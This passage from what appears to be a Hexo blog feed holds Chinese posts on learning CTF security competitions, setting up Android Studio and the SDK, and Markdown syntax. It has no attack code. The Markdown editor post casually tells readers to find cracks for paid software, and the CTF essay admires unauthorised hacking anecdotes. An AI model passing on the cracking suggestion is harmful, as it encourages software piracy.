        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次接触到这个领域还是在某次新闻上看到的，说某个人用ATM的漏洞去了多少钱，当时想这个人好NB，我也好想这种将所有东西玩弄于股掌之间的感觉，后来自己上网搜各种资料，大概是高二的时候找了个师傅，教了我一些基本的日站的技巧，不过貌似几个月后，在他日了广州图书馆之后没几天，他就被请去喝茶了，然后就没了消息。。。<br>后来高中毕业了，想着选一个和自己兴趣相近的专业，然后就看到了信息安全，当时感觉新鲜，就试着填报了。结果自然是被录取了，也算是合自己的心意了。  </p><a id="more"></a><p>开始的时候按照学校的课程安排，重复的上课，下课，感觉业没啥意思。某天听闻学长拿了“蓝盾杯”二等奖，开始对网络攻防赛感兴趣，问了学长该怎么学习相关的知识，然后给了我几个网址，让我有空就到上面去练练手。<br>一开始也觉得挺有趣，就直接登上去做题，做着做着发现自己的知识储备不够，没办法，只能退出来，好好的充充电，后来自己慢慢的找一些书来看，渐渐的自己就摸索出了适合自己的方法，虽说技术还是很垃圾，和以前相比总归有点进步。  </p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>做这种题我的感觉是先看例题，现在网络上的资源很多，一些基础的能很方便的找到，比如sql注入，xss，还有其他的web应用漏洞等等，等熟悉了基本的原理，这时候就可以自己搭建一个环境来练手，虽说网上有很多实验环境，但是总是没有比本地更加全面具体，这里推荐的环境有dvwa，sqli—labs等等，以后总是需要自己搭建各种环境的，不如现在练练手也好。  </p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>这类的话，我只能说多做题，多开发脑洞，越大越好，还有就是找各种稀奇古怪的题来做。做多了，其实你会发现这种题一般都是套路了，在这儿我推荐一本书，感觉对新手还不错，《数据隐藏技术揭秘 破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》。<br>想练手的也可以去实验吧去找找题做一做，那上面的题大部分还是不错的。</p><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>这类的题我一般都是在实验吧上面找的，我对这个不是太在行，目前还处于起步阶段，大部分只是来源还是书籍和网络资源，最多还属看别人各种博客。</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>这个对某些人属于挑战自我的题目，做出来之后会有很强的满足感，大部分还是网络资源比较多，看雪学院的应该是比较优秀的论坛了，我的大部分PWN的只是都是从那里学来的。  </p><p>目前来看，网络安全攻防赛不出意外也就从上面这些题目中延伸，如果是企业赛的话，会考虑到服务器的安全配置，应用程序的安全配置，基本上都是以一个漏洞百出的网站为基础。在比赛中攻击和防御都会考察，但是不知防，何来攻，这也是目前我需要掌握的，还需努力啊。  </p><p>PS：文章中提到的一些网站或者练手站点，我会另写一篇介绍。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android studio+SDK环境搭建指南</title>
      <link href="/2018/09/02/Android-studio-SDK%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/"/>
      <url>/2018/09/02/Android-studio-SDK%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>系统版本：Windows 10 1709 64bit<br>Android Studio版本：3.1.4  </p><h1 id="0x00-注意！！！"><a href="#0x00-注意！！！" class="headerlink" title="0x00 注意！！！"></a>0x00 注意！！！</h1><p>校园网有毒，最好使用热点！！！某个问题让我纠结了两天，网上各种方法都试了，最后换了个网络就好了。。。<br>mmp</p><h1 id="1-JDK安装"><a href="#1-JDK安装" class="headerlink" title="1. JDK安装"></a>1. JDK安装</h1><p>Android开发工具要求必须安装 JDK(JavaDevelopment Kit)，不能只安装JRE(Java Runtime Edition)，因为这是Android Device Monitor 所需要的。在安装Android开发工具之前需要先安装Java JDK。尤其是AS的开发过程必须要JDK或者JRE的支持，否则在启动AS的时候就会报错。<br><a id="more"></a></p><ol><li>JDK下载<br>首先到<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">Java官网</a>下载，我使用的是jdk1.8.0_181  <img src="/2018/09/02/Android-studio-SDK环境搭建指南/Snipaste_2018-09-02_21-27-38.png">  勾选<code>Accept License Agreement</code>，然后下载对应版本的JDK<br>下载好后安装  <img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180106140053157.png">注意记下路径，以后会用到，可以自己选择<img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180106140104886.png">  <img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180106140113865.png">JDK安装完成后会显示安装JRE，自己选择路径安装<img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180106140122426.png">  <img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180106140136528.png">  <img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180106140144944.png">  安装完成后单击关闭，接下来配置环境变量。</li></ol><h1 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2. 配置环境变量"></a>2. 配置环境变量</h1><p>桌面-&gt;右键”此电脑”-&gt;属性-&gt;高级系统设置-&gt;环境变量，在系统变量中找到PATH，单击编辑，选择新建，将<code>%Java安装目录%/bin</code>和<code>Java安装目录/jre/bin</code>两个路径填进去<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/Snipaste_2018-09-02_21-52-01.png"><br>验证安装是否成功，打开命令行窗口，在命令提示符下执行<code>javac -version</code> 。如果安装成功，就会看到Oracle JDK版本号。<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/Snipaste_2018-09-02_22-02-35.png"><br>至此，基础环境搭建完毕，下面正式安装Android Studio搭建环境。</p><h1 id="3-Android-Studio下载和安装"><a href="#3-Android-Studio下载和安装" class="headerlink" title="3. Android Studio下载和安装"></a>3. Android Studio下载和安装</h1><p>首先，在<a href="http://www.androiddevtools.cn/" target="_blank" rel="noopener">这个网站</a>下载安装包，推荐最新的正式版，记得用浏览器自带的下载器或者使用FDM，使用迅雷会出现死链。（无法下载的可以找我要安装包）<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/Snipaste_2018-09-02_21-58-19.png"><br>下载完毕后双击安装，根据向导完成安装。<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151121006.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151132553.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151142745.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151154929.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151203765.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151447184.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104151531012.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104152218866.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104152735671.png"><br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104152855251.png"><br>此时可以点击cancel，按照默认配置安装SDK，我选择关闭窗口，自己安装SDK，这样可以更改SDK安装目录（因为SDK所需空间较大，默认是在C盘）。  </p><h1 id="4-SDK下载与安装"><a href="#4-SDK下载与安装" class="headerlink" title="4. SDK下载与安装"></a>4. SDK下载与安装</h1><p>首先在<a href="http://www.androiddevtools.cn/" target="_blank" rel="noopener">这个网站</a>下载SDk安装包，推荐下载压缩包，解压后即可使用。<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/Snipaste_2018-09-03_12-35-12.png"><br>打开SDK的解压目录，双击SDK manager.exe<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/Snipaste_2018-09-03_12-38-21.png"><br>等待一段时间后会出现下载列表，勾选你想要下载的tools，点击install packages，然后选择 同意条款即可下载。</p><blockquote><p>Android SDK Tools和Android SDK Platform-tools是必须要下载的。</p></blockquote><p>若在更新下载列表时报错，或出现dl.google.com拒绝连接，请关闭代理，并清空缓存Tools-&gt;options-&gt;clear cache，然后重启SDK manager。<br>下载解压完成后添加两项环境变量：<code>%你的SDK安装目录%/platform-tools</code>和<code>%你的SDK安装目录%/tools</code>。  </p><h1 id="5-开始使用AS"><a href="#5-开始使用AS" class="headerlink" title="5. 开始使用AS"></a>5. 开始使用AS</h1><p>上述步骤完成后，即可打开AS。若打开后显示如下：<br><img src="/2018/09/02/Android-studio-SDK环境搭建指南/20180104152855251.png"><br>请在<code>%AS安装目录%/bin</code>下的<code>idea.properties</code>文件中添加如下一句话：<code>disable.android.first.run=true</code><br>此时可按照自己的喜好创建一个空白的工程。  </p><p>未完待续…</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程随笔 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Markdown的简单世界（二）</title>
      <link href="/2018/08/29/Markdown%E7%9A%84%E7%AE%80%E5%8D%95%E4%B8%96%E7%95%8C%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2018/08/29/Markdown%E7%9A%84%E7%AE%80%E5%8D%95%E4%B8%96%E7%95%8C%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h1><p>一行文字就是一个段落<br>比如<br>这是一个段落。<br>会被解释成为  </p><blockquote><p><code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code></p></blockquote><a id="more"></a><p>若需要另起一段，直接在两个段落之间空一行即可。也可以在第一个段落之后空两个，然后换行即可。  </p><blockquote><p>这是一个段落。</p><p>这是另一个段落。 </p></blockquote><p>会被解释成  </p><blockquote><p><code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code><br><code>&lt;p&gt;这是另一个段落。&lt;/p&gt;</code></p></blockquote><p>在hexo中，直接换行等同于键入空格，所以需要打两个空格  </p><h1 id="粗体和斜体"><a href="#粗体和斜体" class="headerlink" title="粗体和斜体"></a>粗体和斜体</h1><p>可以使用 <code>*</code> 或 <code>_</code> 指定斜体或粗体。  </p><blockquote><p><em>这是斜体</em><br><em>这也是斜体</em><br><strong>这是粗体</strong><br><strong><em>这是粗体+斜体</em></strong>` </p></blockquote><p>以上会被对应解释为</p><blockquote><p><code>&lt;em&gt;这是斜体&lt;/em&gt;</code><br><code>&lt;em&gt;这也是斜体&lt;/em&gt;</code><br><code>&lt;strong&gt;这是粗体&lt;/strong&gt;</code><br><code>&lt;strong&gt;&lt;em&gt;这是粗体+斜体&lt;/strong&gt;&lt;/em&gt;</code>  </p></blockquote><p>快捷键  ctrl+B加粗   ctrl+I斜体</p><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>markdown总共支持六级标题，通过在一行之前加上不同数量的 <code>#</code> 号来表示。<br>行尾可以加上任意数量的井号字符，这些字符不会算作标题内容。通常会加上相等数量的字符以保持对称。<br>此外，H1和H2也可以采用在文本下方添加底线来实现，比如</p><h1 id="这是H1"><a href="#这是H1" class="headerlink" title="这是H1  "></a>这是H1  </h1><h2 id="这是H2"><a href="#这是H2" class="headerlink" title="这是H2"></a>这是H2</h2><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>通过在行首加上 <code>&gt;</code> 来添加引用格式。</p><blockquote><p>this is the test.</p></blockquote><p>引用可以嵌套：</p><blockquote><p>test1</p><blockquote><p>test2  </p></blockquote></blockquote><p>也可以嵌套其他格式:</p><blockquote><p>##这是一个标题</p><ol><li>这是第一行。  </li><li>这是第二行。  </li></ol></blockquote><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>无序列表可以使用星号 <code>*</code>、加号<code>+</code>或者减号<code>-</code>作为标记：</p><blockquote><ul><li>red  </li><li>green  </li><li>blue  </li></ul></blockquote><p>等同于  </p><blockquote><ul><li>red  </li><li>green  </li><li>blue  </li></ul></blockquote><p>或  </p><blockquote><ul><li>red   </li><li>green  </li><li>blue  </li></ul></blockquote><p>有序列表可以使用数字接着一个半角点：</p><blockquote><ol><li>red  </li><li>green  </li><li>blue  </li></ol></blockquote><p>数字并不影响html的输出结果。  </p><h1 id="内联代码"><a href="#内联代码" class="headerlink" title="内联代码"></a>内联代码</h1><p>用反引号 <code>`</code> 来标记内联代码，<br>它们会解释成<code>&lt;code&gt;</code>标签。如果代码的内容中有反引号，请用两个反引号包裹。代码中的&amp;、&lt;、&gt;符号都会自动转义，请放心使用。  </p><h1 id="代码区域"><a href="#代码区域" class="headerlink" title="代码区域"></a>代码区域</h1><p>有两种标记代码的区域，原生风格时行首缩进四个空格。<br>还有一种是github风格，代码的前后用三个反引号独占一行来标记。</p><blockquote><pre><code>这是一个代码区块  </code></pre></blockquote><h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>你可以在一行中用三个以上的星号 <code>*</code> 、减号 <code>-</code> 、底线 <code>_</code> 来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。  </p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><blockquote><p><code>[an example](http://example.com/)</code><br><code>[an example](http://example.com/ &quot;Optional Title&quot;)</code></p></blockquote><p>会被解释为  </p><blockquote><p><code>&lt;a href=&#39;http://example.com/&#39;&gt;an example&lt;/a&gt;</code><br><code>&lt;a href=&#39;http://example.com/&#39; title=&quot;Optional Title&quot;&gt;an example&lt;/a&gt;</code>  </p></blockquote><p>处行内式之外，也可以使用参考式：</p><blockquote><p><code>[an example][id]</code>  </p></blockquote><p>然后在任意空白处位置定义：</p><blockquote><p><code>[id]: http://example.com/ &quot;Optional Title&quot;</code>  </p></blockquote><h1 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h1><blockquote><p><code>![Alt text](/path/to/img.jpg)</code><br><code>![Alt text](/path/to/img.jpg &quot;Optional Title&quot;)</code>   </p></blockquote><p>会被解释为：</p><blockquote><p><code>&lt;img src=&#39;/path/to/img.jpg&#39; alt=&#39;Alt text&#39; /&gt;</code><br><code>&lt;img src=&#39;/path/to/img.jpg&#39; alt=&#39;Alt text&#39; title=&#39;Optional Title&#39; /&gt;</code>  </p></blockquote><p>同样，图像也有同链接类似的参考式语法。  </p><h1 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a>自动链接</h1><p>如果链接的地址和名字重复，可以用尖括号语法将其简化。</p><blockquote><p><code>&lt;http://example.com/&gt;</code>  </p></blockquote><p>就相当于  </p><blockquote><p><code>[http://example.com/](http://example.com/)</code></p></blockquote><p>大多数编辑器都会自动将符合url规则的东西视为链接，并且解释成链接。很多时候作者由于疏忽等缘故，链接和后面的中文之间缺少空格，导致链接不正常。所以我建议，链接要么加上尖括号，要么两端加上空格。  </p><h1 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h1><p>markdown支持在以下字符前面插入反斜杠</p><p>\   反斜线<br>`   反引号<br>*   星号<br>_   底线<br>{}  花括号<br>[]  方括号<br>()  括弧<br>#   井字号<br>+   加号<br>-   减号<br>.   英文句点<br>!   惊叹号  </p><p>插入之后，将不再解析这些字符，而是原样输出。  </p><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><blockquote><p><code>| Item     | Value | Qty   |</code><br><code>| :------- | ----: | :---: |</code><br><code>| Computer | $1600 |  5    |</code><br><code>| Phone    | $12   |  12   |</code><br><code>| Pipe     | $1    |  234  |</code></p></blockquote><blockquote><table><thead><tr><th style="text-align:left">Item</th><th style="text-align:right">Value</th><th style="text-align:center">Qty</th></tr></thead><tbody><tr><td style="text-align:left">Computer</td><td style="text-align:right">$1600</td><td style="text-align:center">5</td></tr><tr><td style="text-align:left">Phone</td><td style="text-align:right">$12</td><td style="text-align:center">12</td></tr><tr><td style="text-align:left">Pipe</td><td style="text-align:right">$1</td><td style="text-align:center">234</td></tr></tbody></table></blockquote><p>要注意第二行的冒号决定了居左居右还是居中，如果你不加冒号，默认是居左的。</p><p>另外可以把第一行去掉，做成没有表头的表格，但第二行始终是要有的。</p><h1 id="内联HTML"><a href="#内联HTML" class="headerlink" title="内联HTML"></a>内联HTML</h1><p>markdown 的语法简洁，但有其局限性，所以特意保留了内联html这种方式。任何html标签及其内容，都会原样输出到结果中。也就是说，标签中的星号等作为markdown结构的符号，以及构成html标签和实体的符号，都不会做任何转义。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程随笔 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Markdown的简单世界（一）</title>
      <link href="/2018/08/28/Markdown%E7%9A%84%E7%AE%80%E5%8D%95%E4%B8%96%E7%95%8C%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2018/08/28/Markdown%E7%9A%84%E7%AE%80%E5%8D%95%E4%B8%96%E7%95%8C%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Markdown的简介</p><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</p><a id="more"></a>  <p>Markdown具有一系列衍生版本，用于扩展Markdown的功能（如表格、脚注、内嵌HTML等等），这些功能原初的Markdown尚不具备，它们能让Markdown转换成更多的格式，例如LaTeX，Docbook。Markdown增强版中比较有名的有Markdown Extra、MultiMarkdown、 Maruku等。这些衍生版本要么基于工具，如Pandoc；要么基于网站，如GitHub和Wikipedia，在语法上基本兼容，但在一些语法和渲染效果上有改动。</p><p>Markdown的编辑器推荐</p><p>在线版我就不多说了，像简书，马克印象都可以，但是很少用到，我一般使用本地版，个人推荐Markdownpad2，这个产品我感觉用着很舒服，但是需要注册购买，其实这个软件的free版本就足够了，pro版本有更高级的功能，交互性更好，想安装的话可以自己去找找破解方法。对了，安装之后还需要安装一个sdk，以解决html error的问题。<br>想了解更多关于编辑器的可以看看这个：<a href="https://wizardforcel.gitbooks.io/markdown-simple-world/1.html" title="Markdown 编辑器推荐" target="_blank" rel="noopener">Markdown 编辑器推荐</a><br>以上内容参考：<a href="https://www.gitbook.com/book/wizardforcel/markdown-simple-world" target="_blank" rel="noopener">Markdown 简单的世界</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程随笔 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
